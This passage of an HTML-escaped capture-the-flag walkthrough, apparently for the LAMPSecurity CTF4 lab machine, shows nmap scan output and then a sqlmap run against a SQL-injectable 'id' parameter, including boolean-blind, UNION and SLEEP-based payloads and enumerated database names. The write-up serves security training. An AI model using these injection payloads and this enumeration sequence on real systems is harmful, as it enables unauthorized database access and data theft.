class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;RSET&lt;/span&gt; &lt;span class="nt"&gt;NOOP&lt;/span&gt; &lt;span class="nt"&gt;QUIT&lt;/span&gt; &lt;span class="nt"&gt;HELP&lt;/span&gt; &lt;span class="nt"&gt;VRFY&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;EXPN&lt;/span&gt; &lt;span class="nt"&gt;VERB&lt;/span&gt; &lt;span class="nt"&gt;ETRN&lt;/span&gt; &lt;span class="nt"&gt;DSN&lt;/span&gt; &lt;span class="nt"&gt;AUTH&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;STARTTLS&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;For&lt;/span&gt; &lt;span class="nt"&gt;more&lt;/span&gt; &lt;span class="nt"&gt;info&lt;/span&gt; &lt;span class="nt"&gt;use&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HELP &amp;amp;lt;topic&amp;amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;To&lt;/span&gt; &lt;span class="nt"&gt;report&lt;/span&gt; &lt;span class="nt"&gt;bugs&lt;/span&gt; &lt;span class="nt"&gt;in&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;implementation&lt;/span&gt; &lt;span class="nt"&gt;send&lt;/span&gt; &lt;span class="nt"&gt;email&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;sendmail-bugs&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;sendmail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;For&lt;/span&gt; &lt;span class="nt"&gt;local&lt;/span&gt; &lt;span class="nt"&gt;information&lt;/span&gt; &lt;span class="nt"&gt;send&lt;/span&gt; &lt;span class="nt"&gt;email&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;Postmaster&lt;/span&gt; &lt;span class="nt"&gt;at&lt;/span&gt; &lt;span class="nt"&gt;your&lt;/span&gt; &lt;span class="nt"&gt;site&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;End&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;HELP&lt;/span&gt; &lt;span class="nt"&gt;info&lt;/span&gt;
&lt;span class="nt"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;tcp&lt;/span&gt;  &lt;span class="nt"&gt;open&lt;/span&gt;   &lt;span class="nt"&gt;http&lt;/span&gt;    &lt;span class="nt"&gt;Apache&lt;/span&gt; &lt;span class="nt"&gt;httpd&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nt"&gt;Fedora&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;_http-methods&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;No&lt;/span&gt; &lt;span class="nt"&gt;Allow&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;Public&lt;/span&gt; &lt;span class="nt"&gt;header&lt;/span&gt; &lt;span class="nt"&gt;in&lt;/span&gt; &lt;span class="nt"&gt;OPTIONS&lt;/span&gt; &lt;span class="nt"&gt;response&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;status&lt;/span&gt; &lt;span class="nt"&gt;code&lt;/span&gt; &lt;span class="nt"&gt;200&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;http-robots&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;txt&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt; &lt;span class="nt"&gt;disallowed&lt;/span&gt; &lt;span class="nt"&gt;entries&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;_&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;restricted&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;conf&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;sql&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;admin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;_http-title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  &lt;span class="nt"&gt;Prof&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;Ehks&lt;/span&gt;
&lt;span class="nt"&gt;631&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;tcp&lt;/span&gt; &lt;span class="nt"&gt;closed&lt;/span&gt; &lt;span class="nt"&gt;ipp&lt;/span&gt;
&lt;span class="nt"&gt;Aggressive&lt;/span&gt; &lt;span class="nt"&gt;OS&lt;/span&gt; &lt;span class="nt"&gt;guesses&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;16&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;21&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;98&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;13&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;32&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;96&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;Control4&lt;/span&gt; &lt;span class="nt"&gt;HC-300&lt;/span&gt; &lt;span class="nt"&gt;home&lt;/span&gt; &lt;span class="nt"&gt;controller&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;96&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;Lantronix&lt;/span&gt; &lt;span class="nt"&gt;SLC&lt;/span&gt; &lt;span class="nt"&gt;8&lt;/span&gt; &lt;span class="nt"&gt;terminal&lt;/span&gt; &lt;span class="nt"&gt;server&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;96&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;SNR&lt;/span&gt; &lt;span class="nt"&gt;SNR-S2960&lt;/span&gt; &lt;span class="nt"&gt;switch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;95&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;SonicWALL&lt;/span&gt; &lt;span class="nt"&gt;Aventail&lt;/span&gt; &lt;span class="nt"&gt;EX-6000&lt;/span&gt; &lt;span class="nt"&gt;VPN&lt;/span&gt; &lt;span class="nt"&gt;appliance&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;8&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;30&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;Dell&lt;/span&gt; &lt;span class="nt"&gt;iDRAC&lt;/span&gt; &lt;span class="nt"&gt;6&lt;/span&gt; &lt;span class="nt"&gt;remote&lt;/span&gt; &lt;span class="nt"&gt;access&lt;/span&gt; &lt;span class="nt"&gt;controller&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;9&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;18&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%),&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;18&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;32&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%)&lt;/span&gt;
&lt;span class="nt"&gt;No&lt;/span&gt; &lt;span class="nt"&gt;exact&lt;/span&gt; &lt;span class="nt"&gt;OS&lt;/span&gt; &lt;span class="nt"&gt;matches&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;host&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;test&lt;/span&gt; &lt;span class="nt"&gt;conditions&lt;/span&gt; &lt;span class="nt"&gt;non-ideal&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nt"&gt;Service&lt;/span&gt; &lt;span class="nt"&gt;Info&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;ctf4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;sas&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;upenn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;edu&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;OS&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Unix&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We found a list of available services:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a SSH service on port 22&lt;/li&gt;
&lt;li&gt;a mail service on port 25&lt;/li&gt;
&lt;li&gt;a web service on port 80, note that there is five disallowed entries in robots.txt&lt;/li&gt;
&lt;li&gt;and a close CUPS service on port 631.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;The website&lt;/h2&gt;
&lt;p&gt;Let's take a look at the web site. It is a simple blog site with a XSS flaw on
the search engine.&lt;/p&gt;
&lt;p&gt;The article are indexed with a GET parameter id. This parameter is vulnerable to
an SQL injection.&lt;/p&gt;
&lt;h1&gt;Exploitation&lt;/h1&gt;
&lt;h2&gt;Sqlmap&lt;/h2&gt;
&lt;p&gt;We launch sqlmap:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;sqlmap&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://192.168.1.56/index.html?page=blog&amp;amp;amp;title=Blog&amp;amp;amp;id=6&amp;#39;&lt;/span&gt; &lt;span class="nt"&gt;-p&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt; &lt;span class="nt"&gt;--tables&lt;/span&gt;
  &lt;span class="nt"&gt;sqlmap&lt;/span&gt; &lt;span class="nt"&gt;identified&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;following&lt;/span&gt; &lt;span class="nt"&gt;injection&lt;/span&gt; &lt;span class="nt"&gt;points&lt;/span&gt; &lt;span class="nt"&gt;with&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="nt"&gt;total&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;s&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;---&lt;/span&gt;
  &lt;span class="nt"&gt;Place&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;GET&lt;/span&gt;
  &lt;span class="nt"&gt;Parameter&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt;
      &lt;span class="nt"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;boolean-based&lt;/span&gt; &lt;span class="nt"&gt;blind&lt;/span&gt;
      &lt;span class="nt"&gt;Title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;AND&lt;/span&gt; &lt;span class="nt"&gt;boolean-based&lt;/span&gt; &lt;span class="nt"&gt;blind&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;WHERE&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;HAVING&lt;/span&gt; &lt;span class="nt"&gt;clause&lt;/span&gt;
      &lt;span class="nt"&gt;Payload&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;Blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;6&lt;/span&gt; &lt;span class="nt"&gt;AND&lt;/span&gt; &lt;span class="nt"&gt;2396&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;2396&lt;/span&gt;

      &lt;span class="nt"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;query&lt;/span&gt;
      &lt;span class="nt"&gt;Title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;MySQL&lt;/span&gt; &lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;query&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;NULL&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt; &lt;span class="nt"&gt;columns&lt;/span&gt;
      &lt;span class="nt"&gt;Payload&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;Blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;6&lt;/span&gt; &lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;ALL&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;NULL&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;CONCAT&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;0x7172756f71&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x494c647a675a47595a55&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x7178657471&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt;&lt;span class="nt"&gt;NULL&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;NULL&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;NULL&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;

      &lt;span class="nt"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;AND&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;OR&lt;/span&gt; &lt;span class="nt"&gt;time-based&lt;/span&gt; &lt;span class="nt"&gt;blind&lt;/span&gt;
      &lt;span class="nt"&gt;Title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;MySQL&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;11&lt;/span&gt; &lt;span class="nt"&gt;AND&lt;/span&gt; &lt;span class="nt"&gt;time-based&lt;/span&gt; &lt;span class="nt"&gt;blind&lt;/span&gt;
      &lt;span class="nt"&gt;Payload&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;Blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;6&lt;/span&gt; &lt;span class="nt"&gt;AND&lt;/span&gt; &lt;span class="nt"&gt;SLEEP&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="nt"&gt;---&lt;/span&gt;
  &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;INFO&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;back-end&lt;/span&gt; &lt;span class="nt"&gt;DBMS&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;MySQL&lt;/span&gt;
  &lt;span class="nt"&gt;web&lt;/span&gt; &lt;span class="nt"&gt;server&lt;/span&gt; &lt;span class="nt"&gt;operating&lt;/span&gt; &lt;span class="nt"&gt;system&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;Fedora&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Bordeaux&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="nt"&gt;web&lt;/span&gt; &lt;span class="nt"&gt;application&lt;/span&gt; &lt;span class="nt"&gt;technology&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Apache&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;PHP&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;2&lt;/span&gt;
  &lt;span class="nt"&gt;back-end&lt;/span&gt; &lt;span class="nt"&gt;DBMS&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;MySQL&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;11&lt;/span&gt;
  &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;INFO&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;fetching&lt;/span&gt; &lt;span class="nt"&gt;database&lt;/span&gt; &lt;span class="nt"&gt;names&lt;/span&gt;
  &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;INFO&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;fetching&lt;/span&gt; &lt;span class="nt"&gt;tables&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;databases&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;calendar, ehks, information_schema, mysql, roundcubemail, test&amp;#39;&lt;/span&gt;
  &lt;span class="nt"&gt;Database&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;calendar&lt;/span&gt;
  &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="nx"&gt;tables&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;phpc_calendars&lt;/span&gt;                        &lt;span class="o"&gt;|&lt;/span&gt;
